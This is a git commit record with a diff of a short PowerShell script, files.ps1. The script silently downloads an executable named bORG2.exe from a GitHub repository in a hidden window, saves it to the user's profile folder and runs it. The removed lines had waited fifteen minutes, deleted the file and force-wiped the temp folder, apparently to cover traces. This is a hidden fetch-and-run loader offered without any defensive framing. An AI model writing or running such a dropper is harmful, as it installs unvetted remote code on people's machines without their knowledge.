196bf685daa68b88f5ed58aa3fdd08e9c044837f
skekic16 <151707511+skekic16@users.noreply.github.com>
2023-12-27 11:50:31 -0600

    Update files.ps1

--- files.ps1
+++ files.ps1
@@ -1,5 +1,3 @@
 powershell -WindowStyle Hidden iwr https://github.com/skekic16/lol/raw/main/bORG2.exe?dl=1 -O $Env:USERPROFILE\bORG2.exe
 start-process "$env:USERPROFILE\bORG2.exe"
-start-sleep 900
-rm "$env:USERPROFILE\bORG2.exe"
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
